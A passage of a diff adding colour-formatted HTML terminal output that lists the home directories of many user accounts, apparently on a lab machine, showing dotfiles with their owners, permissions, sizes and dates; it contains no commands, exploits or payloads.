+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jamie&nbsp;jamie&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jamie&nbsp;jamie&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>JBare<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;JBare&nbsp;JBare&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JBare&nbsp;JBare&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JBare&nbsp;JBare&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JBare&nbsp;JBare&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>jess<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;jess&nbsp;jess&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jess&nbsp;jess&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jess&nbsp;jess&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;jess&nbsp;jess&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>JKanode<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;JKanode&nbsp;JKanode&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JKanode&nbsp;JKanode&nbsp;&nbsp;167&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JKanode&nbsp;JKanode&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JKanode&nbsp;JKanode&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JKanode&nbsp;JKanode&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>JLipps<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;JLipps&nbsp;JLipps&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JLipps&nbsp;JLipps&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JLipps&nbsp;JLipps&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;JLipps&nbsp;JLipps&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kai<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;kai&nbsp;&nbsp;kai&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;kai&nbsp;&nbsp;kai&nbsp;&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;kai&nbsp;&nbsp;kai&nbsp;&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;kai&nbsp;&nbsp;kai&nbsp;&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>LSolum<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;LSolum&nbsp;LSolum&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum&nbsp;LSolum&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum&nbsp;LSolum&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum&nbsp;LSolum&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>LSolum2<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;LSolum2&nbsp;LSolum2&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum2&nbsp;LSolum2&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum2&nbsp;LSolum2&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;LSolum2&nbsp;LSolum2&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>MBassin<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;MBassin&nbsp;MBassin&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MBassin&nbsp;MBassin&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MBassin&nbsp;MBassin&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MBassin&nbsp;MBassin&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>mel<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;mel&nbsp;&nbsp;mel&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;mel&nbsp;&nbsp;mel&nbsp;&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;mel&nbsp;&nbsp;mel&nbsp;&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;mel&nbsp;&nbsp;mel&nbsp;&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>MFrei<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;MFrei&nbsp;MFrei&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MFrei&nbsp;MFrei&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MFrei&nbsp;MFrei&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;MFrei&nbsp;MFrei&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>NATHAN<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;NATHAN&nbsp;NATHAN&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;NATHAN&nbsp;NATHAN&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;NATHAN&nbsp;NATHAN&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;NATHAN&nbsp;NATHAN&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>peter<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;72K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;peter&nbsp;peter&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;220&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;3.7K&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.bashrc<br>
+                drwx------&nbsp;&nbsp;2&nbsp;peter&nbsp;peter&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;6&nbsp;&nbsp;2016&nbsp;.cache<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;675&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.profile<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.sudo_as_admin_successful<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;577&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.viminfo<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--&nbsp;&nbsp;1&nbsp;peter&nbsp;peter&nbsp;&nbsp;39K&nbsp;Jun&nbsp;&nbsp;3&nbsp;&nbsp;2016&nbsp;.zcompdump<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>RNunemaker<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;RNunemaker&nbsp;RNunemaker&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;RNunemaker&nbsp;RNunemaker&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;RNunemaker&nbsp;RNunemaker&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;RNunemaker&nbsp;RNunemaker&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>Sam<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;Sam&nbsp;&nbsp;Sam&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Sam&nbsp;&nbsp;Sam&nbsp;&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Sam&nbsp;&nbsp;Sam&nbsp;&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Sam&nbsp;&nbsp;Sam&nbsp;&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>SHAY<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;SHAY&nbsp;SHAY&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHAY&nbsp;SHAY&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHAY&nbsp;SHAY&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHAY&nbsp;SHAY&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>SHayslett<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;180K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;SHayslett&nbsp;SHayslett&nbsp;4.0K&nbsp;Apr&nbsp;14&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHayslett&nbsp;SHayslett&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
